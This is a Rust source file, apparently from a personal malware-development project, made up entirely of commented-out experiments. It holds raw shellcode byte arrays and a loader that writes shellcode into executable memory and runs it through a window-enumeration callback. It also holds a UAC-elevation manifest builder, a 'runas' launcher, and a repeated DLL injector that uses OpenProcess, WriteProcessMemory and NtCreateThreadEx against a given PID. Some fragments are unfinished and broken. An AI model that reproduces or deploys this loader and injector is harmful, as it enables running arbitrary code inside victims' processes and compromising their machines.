// 0xf0,0x2b,0x33,0xef,0x51,0x85,0xab,0x85,0xd3,0x2d,0x36,0x55,
// 0xca,0xed,0xec,0xb9,0xeb,0x37,0x33,0x55,0xc3,0x09,0xdf,0x6f,
// 0xdd,0x7f,0x57,0x44,0x42,0x64,0x2a,0x03,0xe0,0x7c,0xba,0x86,
// 0xee,0xf7,0xa2,0x5f,0xe9,0xf6,0x29,0x44,0x88,0xe7,0xdf,0x46,
// 0xa0,0xad,0x1d,0xe5,0x7b,0xbd,0xe8,0x0c,0xae,0xf8,0x09,0x64,
// 0x03,0xa5,0x68,0x8e,0x29,0x7d,0x7b,0x64,0x4b,0x20,0x23,0x7a,
// 0xc6,0x35,0x7a,0xb4,0x88,0xed,0xfb,0x4a,0x2a,0x3d,0x5b,0x34,
// 0x4a,0xa4,0x33,0xed,0xf7,0x30,0x4a,0xad,0x4b,0x5a,0x2a,0x4f,
// 0x2a,0x49,0xf3,0x2c,0x02,0x73,0xab,0x3f,0x61,0x3c,0xba,0xad,
// 0x0e,0x09,0xa2,0x0f,0x60,0x45,0x9b,0x11,0xf2,0xe9,0xe0,0x42,
// 0x85,0x75,0x3e,0x5d,0xd2,0xd0,0x3b,0x56,0xe5,0xf6,0x3b,0x40,
// 0x4a,0xa4,0x33,0x68,0xe0,0xf6,0x77,0x2c,0x47,0x2e,0xa3,0x12,
// 0xe8,0x7c,0xab,0x25,0x88,0xa1,0x6b,0x46,0xa0,0xad,0x3a,0x3c,
// 0x42,0xfd,0xbd,0x57,0xfb,0x3c,0x23,0x25,0x5a,0xe4,0xb9,0x46,
// 0x22,0x91,0x5b,0x25,0x51,0x5a,0x03,0x56,0xe0,0x24,0x21,0x2c,
// 0x88,0xb7,0x0a,0x45,0x5e,0x82,0x84,0x39,0x4a,0x1b,0x94,0x7d,
// 0x93,0x22,0x48,0x56,0x03,0xa5,0xa2,0x58,0xe8,0xf4,0x9d,0x2c,
// 0x82,0x49,0x43,0x0f,0xa1,0x7d,0x32,0xed,0xe6,0xec,0x5f,0x0c,
// 0xa1,0x6c,0x27,0xa4,0xab,0xc3,0xbe,0x4f,0xf5,0x34,0xf2,0x80,
// 0x4f,0x2c,0x12,0x4f,0x1b,0x31,0x0c,0x42,0x04,0x5a,0x36,0x42,
// 0x28,0x97,0x13,0x65,0x02,0xa5,0xe3,0x57,0xe0,0xc7,0x52,0xe4,
// 0x68,0xa5,0x1c,0xdb,0xcb,0x77,0x3a,0x3a,0x53,0xf5,0xae,0x3f,
// 0x68,0x30,0x4a,0xa4,0x4b,0x5a,0x23,0x46,0x28,0xbf,0x33,0x9b,
// 0xc3,0xed,0x6a,0xcf,0xe0,0xc7,0x91,0x6b,0xdc,0x45,0x1c,0xdb,
// 0xe9,0xf4,0xbc,0x0e,0x13,0xe4,0xbb,0x42,0x28,0x9f,0x33,0xed,
// 0xfa,0xe4,0x59,0x97,0x04,0x09,0x1a,0x9b,0xd6,0x20,0x23,0x7a,
// 0xab,0x34,0x84,0xaa,0x76,0x40,0x0b,0x9d,0xa1,0x7d,0x7b,0x2c,
// 0x80,0x49,0xf3,0x46,0x28,0x9f,0x36,0x55,0xca,0xcf,0xe7,0x4f,
// 0xf9,0x35,0xf2,0x9d,0x42,0x1f,0xe1,0xd7,0x69,0x22,0x84,0xb1,
// 0x80,0x5d,0xe3,0x70,0xf4,0x35,0xf8,0xa0,0x23,0xfb,0x6a,0xf8,
// 0xcb,0x3d,0x3a,0x3d,0x6b,0xa5,0xf3,0x0e,0xa1,0x3c,0x23,0x2c,
// 0x8a,0x57,0xab,0x3f,0x68,0x3c,0xc1,0x3c,0xa7,0xf6,0x06,0xf1,
// 0x74,0x35,0xf2,0xa7,0x4a,0x2c,0x24,0x43,0x90,0xb4,0x32,0xed,
// 0xf3,0xed,0x6a,0xd4,0xe9,0xf4,0x82,0x25,0xb9,0xa7,0x3a,0xc6,
// 0xfe,0x82,0xae,0xe7,0xfb,0xa5,0x9e,0x26,0xf9,0x3c,0x2c,0x3d,
// 0x6b,0xa5,0xa3,0x0e,0xa1,0x3c,0x23,0x0e,0x03,0xff,0xa2,0xb4,
// 0xaa,0x52,0x74,0x54,0xfc,0x70,0xb4,0x57,0xe0,0xc7,0x0e,0x0a,
// 0x4e,0xc4,0x1c,0xdb,0xe8,0x82,0xb5,0x8d,0x3f,0x5a,0x1c,0xf1,
// 0xe9,0x7c,0xb8,0x2c,0x2a,0x63,0xab,0x8b,0x57,0x08,0xcf,0x25,
// 0xfc,0x42,0xbb,0x64,0xa1,0x24,0xc0,0x84,0x1e,0x8f,0xe9,0x4f,
// 0x28,0xa7,0x84,0xb1,0x03];  

    // let shellcode = [0x48,0x31,0xc9,0x48,0x81,0xe9,
    // 0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
    // 0xbb,0xe9,0x44,0x8a,0xc7,0x29,0x75,0x3e,0x08,0x48,0x31,0x58,
    // 0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x15,0x0c,0x09,
    // 0x23,0xd9,0x9d,0xfe,0x08,0xe9,0x44,0xcb,0x96,0x68,0x25,0x6c,
    // 0x59,0xbf,0x0c,0xbb,0x15,0x4c,0x3d,0xb5,0x5a,0x89,0x0c,0x01,
    // 0x95,0x31,0x3d,0xb5,0x5a,0xc9,0x0c,0x01,0xb5,0x79,0x3d,0x31,
    // 0xbf,0xa3,0x0e,0xc7,0xf6,0xe0,0x3d,0x0f,0xc8,0x45,0x78,0xeb,
    // 0xbb,0x2b,0x59,0x1e,0x49,0x28,0x8d,0x87,0x86,0x28,0xb4,0xdc,
    // 0xe5,0xbb,0x05,0xdb,0x8f,0xa2,0x27,0x1e,0x83,0xab,0x78,0xc2,
    // 0xc6,0xf9,0xfe,0xbe,0x80,0xe9,0x44,0x8a,0x8f,0xac,0xb5,0x4a,
    // 0x6f,0xa1,0x45,0x5a,0x97,0xa2,0x3d,0x26,0x4c,0x62,0x04,0xaa,
    // 0x8e,0x28,0xa5,0xdd,0x5e,0xa1,0xbb,0x43,0x86,0xa2,0x41,0xb6,
    // 0x40,0xe8,0x92,0xc7,0xf6,0xe0,0x3d,0x0f,0xc8,0x45,0x05,0x4b,
    // 0x0e,0x24,0x34,0x3f,0xc9,0xd1,0xa4,0xff,0x36,0x65,0x76,0x72,
    // 0x2c,0xe1,0x01,0xb3,0x16,0x5c,0xad,0x66,0x4c,0x62,0x04,0xae,
    // 0x8e,0x28,0xa5,0x58,0x49,0x62,0x48,0xc2,0x83,0xa2,0x35,0x22,
    // 0x41,0xe8,0x94,0xcb,0x4c,0x2d,0xfd,0x76,0x09,0x39,0x05,0xd2,
    // 0x86,0x71,0x2b,0x67,0x52,0xa8,0x1c,0xcb,0x9e,0x68,0x2f,0x76,
    // 0x8b,0x05,0x64,0xcb,0x95,0xd6,0x95,0x66,0x49,0xb0,0x1e,0xc2,
    // 0x4c,0x3b,0x9c,0x69,0xf7,0x16,0xbb,0xd7,0x8f,0x93,0x74,0x3e,
    // 0x08,0xe9,0x44,0x8a,0xc7,0x29,0x3d,0xb3,0x85,0xe8,0x45,0x8a,
    // 0xc7,0x68,0xcf,0x0f,0x83,0x86,0xc3,0x75,0x12,0x92,0x95,0x23,
    // 0x22,0xe3,0x05,0x30,0x61,0xbc,0xc8,0xa3,0xf7,0x3c,0x0c,0x09,
    // 0x03,0x01,0x49,0x38,0x74,0xe3,0xc4,0x71,0x27,0x5c,0x70,0x85,
    // 0x4f,0xfa,0x36,0xe5,0xad,0x29,0x2c,0x7f,0x81,0x33,0xbb,0x5f,
    // 0xa4,0x48,0x19,0x5d,0x26,0x8c,0x3c,0xef,0xc7,0x29,0x75,0x3e,
    // 0x08];

//     let shellcode = include_bytes!("../shellcode.bin");

//     let lpname = CString::new("CalculatorApp").unwrap();
    
//     unsafe{
//         let mutex = CreateMutexA(null_mut(), 0, lpname.as_ptr());
        
//         // 183 (0xB7) -> ERROR_ALREADY_EXISTS || LINK: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
//         if mutex.is_null() || GetLastError() == 183{
//             println!("{} Another instances of Payload already running !",PLS);
//             CloseHandle(mutex);
//             return
//         }



//         let alloc = VirtualAlloc(null_mut(), shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

//         RtlMoveMemory(alloc, shellcode.as_ptr() as _ , shellcode.len());
//         EnumChildWindows(null_mut(), std::mem::transmute(alloc), 0);

//         // if !mutex.is_null(){
//             // CloseHandle(mutex);

//         // }

//         std::thread::sleep(std::time::Duration::from_secs(10));
//         CloseHandle(mutex);

//     }
// }


// use std::fs::File;
// use std::io::prelude::*;
// use winres::WindowsResource;

// use std::io::Result;
// fn main() -> Result<()>{
//     let uac_admin = r#"
//     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
//     <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
//         <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
//             <security>
//                 <requestedPrivileges>
//                     <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
//                 </requestedPrivileges>
//             </security>
//         </trustInfo>
//     </assembly>
//     "#;
//     let mut manifest = File::create("manifest.xml")?;
//     manifest.write_all(uac_admin.as_bytes())?;

//     WindowsResource::new()
//         .set_manifest("manifest.xml").compile()?;

//     Ok(())
// }

// use std::ptr::{self, null_mut};
// use std::ffi::CString;
// use std::os::windows::ffi::OsStrExt;
// use std::iter::once;
// use std::ffi::OsStr;
// use std::io;
// use winapi::um::shellapi::ShellExecuteW;
// use winapi::um::winuser::SW_NORMAL;
// // use winapi::shared::minwindef::HINSTANCE__;
// fn main() -> io::Result<()>{
//     let name = OsStr::new("learn.exe").encode_wide().chain(once(0)).collect::<Vec<u16>>();

//     unsafe{
//         let result = ShellExecuteW(
//             ptr::null_mut(),
//             CString::new("runas").unwrap().as_ptr() as *const u16,
//             name.as_ptr(),
//             null_mut(),
//             null_mut(),
//             SW_NORMAL
//         );

//         if result == null_mut(){
//             return Err(io::Error::last_os_error());
//         }
        
//     }
//     Ok(())
// }

/*
NTDLL Injection using Rust  ....
*/


// use winapi::shared::ntdef::UNICODE_STRING;


// defining our macros ...
// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! warn {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }


// // Structs for Method 2! 
// #[allow(dead_code)]
// #[repr(C)]
// struct UnicodeString{
//     length: u16,
//     maximum_length: u16,
//     buffer: *mut u16,
// }

// #[allow(dead_code)]
// #[repr(C)]
// struct ObjectAttributes{
//     length: u32,
//     root_dir: *mut HANDLE,
//     obj_name: *mut UnicodeString,
//     attributes: u32,
//     secur_desp: *mut (),
//     secur_qual_service: *mut (),
// }

// #[allow(dead_code)]
// #[repr(C)]
// struct CliendId{
//     unique_proc: *mut (),
//     unique_threads: *mut (),
// }


// type NtCreateThreadExFn = extern "system" fn(
//     phThread: *mut HANDLE,
//     DesiredAccess: u32,
//     ObjectAttributes: *mut OBJECT_ATTRIBUTES,
//     ProcessHandle: HANDLE,
//     lpStartAddress: *mut u8,
//     lpParameter: *mut u8,
//     CreateSuspended: u32,
//     StackZeroBits: u32,
//     SizeOfStackCommit: u32,
//     SizeOfStackReserve: u32,
//     lpBytesBuffer: *mut u8,

// ) -> NTSTATUS;

// // --> DECLARED CONVENCTION FUNCTIONS HERE !!!

// use std::env::args;
// use ntapi::ntpsapi::NtOpenProcess;
// // use winapi::shared::minwindef::LPVOID;
// use winapi::shared::ntdef::{OBJECT_ATTRIBUTES,NTSTATUS};
// use winapi::um::errhandlingapi::GetLastError;
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
// use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
// use winapi::um::processthreadsapi::{CreateRemoteThread, CreateThread, OpenProcess};
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::INFINITE;
// use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE,PAGE_READWRITE, PROCESS_ALL_ACCESS};
// use std::ffi::OsStr;
// use std::os::windows::ffi::OsStrExt;
// use winapi::shared::ntdef::HANDLE;
// // use winapi::shared::minwindef::HINSTANCE;
// use winapi::ctypes::c_void;
// use winapi::shared::minwindef::HINSTANCE__;
// use std::ptr::null_mut;
// use winapi::shared::minwindef::HINSTANCE;
// use winapi::um::winnt::



// // Delcaring types ( Lazy works !! )...
// type LPVOID = *mut c_void;
// type CLPVOID = *const c_void;



// fn to_wide_string(s: &str) -> Vec<u16> {
//     OsStr::new(s).encode_wide().chain(Some(0).into_iter()).collect::<Vec<_>>()
// }

// fn get_module_handle(module: &str) -> HINSTANCE{
//     unsafe{ GetModuleHandleW(to_wide_string(module).as_ptr())}
// }

// fn get_proc_addr(modules: HANDLE, func_name: &str) -> LPVOID{
//     unsafe{ GetProcAddress(modules as *mut HINSTANCE__, to_wide_string(func_name).as_ptr() as *const _) as LPVOID}
// }

// fn get_last_error()-> u32{
//     unsafe{ GetLastError()}
// }

// fn alloc_remote_mem(process: HANDLE, size: usize) -> LPVOID{
//     unsafe{ VirtualAllocEx(process,null_mut(), size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)}
// }
//                                                  // data can be either shellcode or an dll injection
//                                                  // for shellcode parse the u type, else parse the &str if parsing the path
//                                                  // For Shellcode [u8; <sizeof(shellcode)] ! [u8;276] eg:  &[u8]
// fn write_rem_mem(process: HANDLE, buffer: LPVOID, data: &str) -> bool{
//     let mut bytes_writter: usize = 0;
//     unsafe{ WriteProcessMemory(process, buffer, data.as_ptr() as CLPVOID, data.len(), &mut bytes_writter) != 0}
// }

// fn create_rem_thread(start_addr: LPVOID, params: LPVOID) -> HANDLE{
//     unsafe{ CreateThread(null_mut(), 0, std::mem::transmute(start_addr), params, 0, null_mut())}
// }

// // Remaining functions doesnt need to return !
// fn wait_for_object(obj: HANDLE){
//     unsafe{ WaitForSingleObject(obj, INFINITE)};
// }

// fn close_handle(handle: HANDLE){
//     unsafe{ CloseHandle(handle)};
// }


// fn main(){

    
//     // DLL EXECUTION PATH FOR YOUR FILE !!!

//     // let dll_path = "../hook.dll";
//     let dll_path = "H:\\malware_development\\hook\\target\\release\\hook.dll";
    
//     let pid_inp = args().collect::<Vec<String>>();
    
//     if pid_inp.len() != 2{
//         warn!("Usage: injector.exe {}", "<PID>");
//         return
//     }
    
//     let pid = pid_inp[1].parse::<u32>().expect("Please provide proper PID:!");
//     okey!("PID : {}",pid);
    
//     okey!("Getting handle to the process {}",pid);
//     unsafe{
//         let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        
//         if process.is_null(){
//             warn!("Failed to get handle of the Process : {:#?}",GetLastError());
//             return
//         }
//         okey!("Getting handle to {} and {}", "Kernel32", "NTDLL");
        
//         let ntdll = get_module_handle("ntdll.dll");
//         let kernel32 = get_module_handle("Kernel32.dll");

        
//         if ntdll.is_null() || kernel32.is_null(){
//             warn!(" Module is NULL. Error: {:#?}",get_last_error());
//             return
//         }
        
//         okey!("ntdll : {:#?}",ntdll);
//         okey!("kernel32: {:#?}",kernel32);

//         okey!("Allocated Memory in the target {}", "Process");
// //


//         let create_thread = get_proc_addr(ntdll as LPVOID, "NtCreateThreadEx\0");

//         let nt_create_thread: NtCreateThreadExFn = {
//             std::mem::transmute(GetProcAddress(ntdll, "NtCreateThreadEx\0".as_ptr() as *const _))
//         };

//         let nt_process = NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
//         // if nt_create_thread == {
//         //     warn!("unable to create thread at nt_thrad {}",GetLastError());
//         // }

        
//         // let create_thread = CreateRemoteThread(process, null_mut(), 0, std::mem::transmute(src), lpParameter, dwCreationFlags, lpThreadId)

//         if create_thread.is_null(){
//             warn!("Unable to get the address of NtCreateThreadEx from NTDLL, Error: {}", get_last_error());
//             return
//         }

//         okey!("Address of NtCreateThreadEx : {:#?}",create_thread);

//         let load_lib = get_proc_addr(kernel32 as LPVOID, "LoadLibraryW\0");
//         if load_lib.is_null(){
//             warn!("Unable to get the address of LoadLibraryW : {:#?}",get_last_error());
//             return
//         }

//         okey!("Address of LoadLibraryW : {:#?}",load_lib);

//         let buffer = alloc_remote_mem(process, dll_path.len());
//         if buffer.is_null(){
//             warn!("Failed to allocate memory in the target process. Error: 0x{:X}",get_last_error());
//             return
//         }

//         okey!("Allocated {} to the target process", "memory");

//         if !write_rem_mem(process, buffer, &dll_path){
//             warn!("Failed to write to the allocated buffer: {:#?}",get_last_error());
//             return
//         }

//         okey!("Wrote {} bytes to allocated buffer", dll_path.len());

//         let thread = create_rem_thread(create_thread, buffer);

//         if thread.is_null(){
//             warn!("Failed to create thread : 0x{:X}",get_last_error());
//             return;
//         }

//         okey!("Thread created : {:#?}",thread);
//         println!("[+] Waiting thread to complete !");

//         wait_for_object(thread);
//         okey!("Thread finished executed {}","\\__Status OKK");
//         okey!("{}","Cleaning up Thread");
        
//         close_handle(thread);
//         close_handle(process);

//         okey!("NTDLL Injected successfully ! {}","OKK");
//     }
// }

// use std::ptr::{null_mut, NonNull};

// use ntapi::ntrtl::RtlInitUnicodeString;
// use winapi::shared::ntdef::UNICODE_STRING;


// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! warn {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }

// fn get_mood(name: &str) -> Option<NonNull<()>>{
//     let mut handle = HANDLE = null_mut();
//     let mut unicode_str: UNICODE_STRING = UNICODE_STRING{
//         Length: 0,
//         MaximumLength: 0,
//         Buffer: null_mut(),
//     };

//     let mod_name: Vec<u16> = OsStr::new(name).encode_wide().chain(once(0)).collect();

//     let status = unsafe{
//         RtlInitUnicodeString(&mut unicode_str, mod_name.as_ptr());
//         Ntapoget
//     };
// }

// fn main(){

// }


// defining our macros ...
// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! warn {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }

// // Declare API's 

// use std::ptr::null_mut;

// use user32::{FindWindowA, GetWindowThreadProcessId};
// use std::ffi::CString;


// const NOPIDSTR: &str = "PROCESS DOES NOT EXISTS";

// fn main(){

//     let process_name = "notepad.exe";
//     let window = CString::new(process_name).expect("Failed");

//     unsafe{
//         let hwnd = FindWindowA(null_mut(), window.as_ptr());

//         if hwnd.is_null(){
//             warn!("Notepad is not Running: Error: {}", NOPIDSTR);
//             return
//         }

//         let mut pid = 0;
//         GetWindowThreadProcessId(hwnd, &mut pid);
        
//         if pid == 0{
//             warn!("Failed to get Process ID: {}", NOPIDSTR);
//             return
//         }

//         okey!("Got {} PID : {}",process_name,pid);
//     }
// }


// defining our macros ...
// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! error {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }

// // use std::process::Command;

// use user32::{FindWindowA, GetWindowThreadProcessId};
// use winapi::um::errhandlingapi::GetLastError;
// use std::ptr::null_mut;
// use std::thread::sleep;
// use std::time::Duration;

// fn get_pid(target: &str){
//     unsafe{
//         let mut win_handle = null_mut();
//         for _ in 0..5 { // Retry 5 times with a delay
//             win_handle = FindWindowA(null_mut(), target.as_ptr() as *const _);
//             if !win_handle.is_null() {
//                 break;
//             }
//             sleep(Duration::from_millis(100));
//         }

//         if win_handle.is_null() {
//             error!("Process {} not found", target);
//             return;
//         }

        
//         let mut process_id: u32 = 0;
//         let result = GetWindowThreadProcessId(win_handle, &mut process_id);

//         if result == 0{
//             error!(" Failed to get Process id, Error: {}",GetLastError());
//             return
//         }

//         okey!("Process: {} has PID: {}",target, process_id);
//     }
// }

// fn main(){
//     let process_name = "mspaint.exe";
//     get_pid(process_name);
// }


// USing ntapi to get the process id 

// use std::ffi::{c_void, OsString};
// use std::os::windows::ffi::OsStringExt;
// // use std::intrinsics::size_of;
// use std::ptr::null_mut;

// use winapi::shared::minwindef::MAX_PATH;
// use winapi::um::handleapi::INVALID_HANDLE_VALUE;
// use winapi::um::processthreadsapi::GetProcessId;
// use winapi::um::psapi::{EnumProcesses, GetProcessImageFileNameW};
// use winapi::um::winnt::HANDLE;
// use winapi::shared::ntdef::NTSTATUS;
// use std::path::Path;

// type NtQueryInformationProcessFn = unsafe extern "system" fn(
//     ProcessHandle: HANDLE,
//     ProcessInformationClass: u32,
//     ProcessInformation: c_void,
//     ProcessInformationLength: u32,
//     ReturnLength: u32,
// ) -> NTSTATUS;

// #[link_name = "ntdll"]
// extern "system" {
//     fn NtQueryInformationProcess(
//         ProcessHandle: HANDLE,
//         ProcessInformationClass: u32,
//         ProcessInformation: c_void,
//         ProcessInformationLength: u32,
//         ReturnLength: *mut u32,
//     ) -> NTSTATUS;
// }

// fn find_pid(proc_name: &str) -> u32{
//     let mut process_id = 0;
//     let process: [HANDLE; 1024] = [null_mut(); 1024]; 

//     let mut bytes_returned = 0;
//     unsafe{
//         EnumProcesses(
//             process.as_ptr() as *mut u32,
//             std::mem::size_of_val(&process) as u32, 
//             &mut bytes_returned
//         );

//         let total_process = bytes_returned / std::mem::size_of::<winapi::shared::ntdef::HANDLE>() as u32;

//         for i in 0..total_process{
//             let process_handle = process[i as usize];
//             if process_handle == null_mut() || process_handle == INVALID_HANDLE_VALUE{
//                 continue;
//             }
//             let mut image_name: [u16; MAX_PATH] = [0; MAX_PATH];
//             let size = MAX_PATH as u32;

//             if GetProcessImageFileNameW(process_handle, image_name.as_mut_ptr(), size) == 0{
//                 continue;
//             }

//             let image_name_osstr = OsString::from_wide(&image_name[..]);

//             if let Some(fl_name) = Path::new(&image_name_osstr).file_name(){
//                 if fl_name == proc_name {
//                     process_id = GetProcessId(process_handle);
//                     break;
//                 }
//             }
//         }
//         process_id
//     }
// }

// fn main(){
//     let target = "notepad.exe";
//     let pid = find_pid(target);
//     println!("[+] Found PID: {}", pid);
// }

// defining our macros ...


// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! warn {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }

// use std::env::args;
// use ntapi::ntpsapi::{NtOpenProcess, PPS_ATTRIBUTE_LIST};
// // use winapi::shared::minwindef::LPVOID;
// use winapi::shared::ntdef::{NTSTATUS, OBJECT_ATTRIBUTES, PVOID};
// use winapi::um::errhandlingapi::GetLastError;
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
// use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
// use winapi::um::processthreadsapi::{CreateRemoteThread, CreateThread, OpenProcess};
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::INFINITE;
// use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE,PAGE_READWRITE, PROCESS_ALL_ACCESS};
// use std::ffi::OsStr;
// use std::os::windows::ffi::OsStrExt;
// use winapi::shared::ntdef::HANDLE;
// // use winapi::shared::minwindef::HINSTANCE;
// use winapi::ctypes::c_void;
// use winapi::shared::minwindef::HINSTANCE__;
// use std::ptr::null_mut;
// use winapi::shared::minwindef::HINSTANCE;
// // use winapi::um::winnt::



// // Delcaring types ( Lazy works !! )...
// type LPVOID = *mut c_void;
// type CLPVOID = *const c_void;



// fn to_wide_string(s: &str) -> Vec<u16> {
//     OsStr::new(s).encode_wide().chain(Some(0).into_iter()).collect::<Vec<_>>()
// }

// fn get_module_handle(module: &str) -> HINSTANCE{
//     unsafe{ GetModuleHandleW(to_wide_string(module).as_ptr())}
// }

// fn get_proc_addr(modules: HANDLE, func_name: &str) -> LPVOID{
//     unsafe{ GetProcAddress(modules as *mut HINSTANCE__, to_wide_string(func_name).as_ptr() as *const _) as LPVOID}
// }

// fn get_last_error()-> u32{
//     unsafe{ GetLastError()}
// }

// fn alloc_remote_mem(process: HANDLE, size: usize) -> LPVOID{
//     unsafe{ VirtualAllocEx(process,null_mut(), size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)}
// }
//                                                  // data can be either shellcode or an dll injection
//                                                  // for shellcode parse the u type, else parse the &str if parsing the path
//                                                  // For Shellcode [u8; <sizeof(shellcode)] ! [u8;276] eg:  &[u8]
// fn write_rem_mem(process: HANDLE, buffer: LPVOID, data: &str) -> bool{
//     let mut bytes_writter: usize = 0;
//     unsafe{ WriteProcessMemory(process, buffer, data.as_ptr() as CLPVOID, data.len(), &mut bytes_writter) != 0}
// }

// fn create_rem_thread(start_addr: LPVOID, params: LPVOID) -> HANDLE{
//     unsafe{ CreateThread(null_mut(), 0, std::mem::transmute(start_addr), params, 0, null_mut())}
// }

// // Remaining functions doesnt need to return !
// fn wait_for_object(obj: HANDLE){
//     unsafe{ WaitForSingleObject(obj, INFINITE)};
// }

// fn close_handle(handle: HANDLE){
//     unsafe{ CloseHandle(handle)};
// }


// // #[link_name = "ntdll"]
// type NstCreateThreadEx = unsafe extern "ystem" fn(
//     ThreadHandle: HANDLE,
//     DesiredAccess: u32,
//     ObjectAttributes: *mut OBJECT_ATTRIBUTES,
//     ProcessHandle: HANDLE,
//     StartRoutine: PVOID,
//     Argument: PVOID,
//     CreateFlags: u32,
//     ZeroBits: usize,
//     StackSize: usize,
//     MaximumStackSize: usize,
//     AttributeList: *mut PPS_ATTRIBUTE_LIST,
// ) -> NTSTATUS;

// fn main(){

    
//     // DLL EXECUTION PATH FOR YOUR FILE !!!

//     // let dll_path = "../hook.dll";
//     let dll_path = "H:\\malware_development\\hook\\target\\release\\hook.dll";
    
//     let pid_inp = args().collect::<Vec<String>>();
    
//     if pid_inp.len() != 2{
//         warn!("Usage: injector.exe {}", "<PID>");
//         return
//     }
    
//     let pid = pid_inp[1].parse::<u32>().expect("Please provide proper PID:!");
//     okey!("PID : {}",pid);
    
//     okey!("Getting handle to the process {}",pid);
//     unsafe{
//         let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        
//         if process.is_null(){
//             warn!("Failed to get handle of the Process : {:#?}",GetLastError());
//             return
//         }
//         okey!("Getting handle to {} and {}", "Kernel32", "NTDLL");
        
//         let ntdll = get_module_handle("ntdll.dll");
//         let kernel32 = get_module_handle("Kernel32.dll");

        
//         if ntdll.is_null() || kernel32.is_null(){
//             warn!(" Module is NULL. Error: {:#?}",get_last_error());
//             return
//         }
        
//         okey!("ntdll : {:#?}",ntdll);
//         okey!("kernel32: {:#?}",kernel32);

//         okey!("Allocated Memory in the target {}", "Process");
// //

//         // Needs to get the address if the NtCreateThreadEx !
//         let create_thread = get_proc_addr(ntdll as LPVOID, "NtCreateThreadEx\0");

//         let nt_create_thread: NtCreateThreadExFn = {
//             std::mem::transmute(GetProcAddress(ntdll, "NtCreateThreadEx\0".as_ptr() as *const _))
//         };

//         let nt_process = NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
//         // if nt_create_thread == {
//         //     warn!("unable to create thread at nt_thrad {}",GetLastError());
//         // }

        
//         // let create_thread = CreateRemoteThread(process, null_mut(), 0, std::mem::transmute(src), lpParameter, dwCreationFlags, lpThreadId)

//         if create_thread.is_null(){
//             warn!("Unable to get the address of NtCreateThreadEx from NTDLL, Error: {}", get_last_error());
//             return
//         }

//         okey!("Address of NtCreateThreadEx : {:#?}",create_thread);

//         let load_lib = get_proc_addr(kernel32 as LPVOID, "LoadLibraryW\0");
//         if load_lib.is_null(){
//             warn!("Unable to get the address of LoadLibraryW : {:#?}",get_last_error());
//             return
//         }

//         okey!("Address of LoadLibraryW : {:#?}",load_lib);

//         let buffer = alloc_remote_mem(process, dll_path.len());
//         if buffer.is_null(){
//             warn!("Failed to allocate memory in the target process. Error: 0x{:X}",get_last_error());
//             return
//         }

//         okey!("Allocated {} to the target process", "memory");

//         if !write_rem_mem(process, buffer, &dll_path){
//             warn!("Failed to write to the allocated buffer: {:#?}",get_last_error());
//             return
//         }

//         okey!("Wrote {} bytes to allocated buffer", dll_path.len());

//         let thread = create_rem_thread(create_thread, buffer);

//         if thread.is_null(){
//             warn!("Failed to create thread : 0x{:X}",get_last_error());
//             return;
//         }

//         okey!("Thread created : {:#?}",thread);
//         println!("[+] Waiting thread to complete !");

//         wait_for_object(thread);
//         okey!("Thread finished executed {}","\\__Status OKK");
//         okey!("{}","Cleaning up Thread");
        
//         close_handle(thread);
//         close_handle(process);

//         okey!("NTDLL Injected successfully ! {}","OKK");
//     }
// }

// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! warn {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }

// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}",format!($msg,$($arg),*));
//     };
// }

// use ntapi::ntexapi::NtQuerySystemInformation;
// use ntapi::ntexapi::SystemProcessInformation;
// use ntapi::ntexapi::SYSTEM_PROCESS_INFORMATION;
// use std::ptr::null_mut;
// use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;

// fn main(){
//     unsafe{
//         let mut buffer: Vec<u8> = Vec::new();
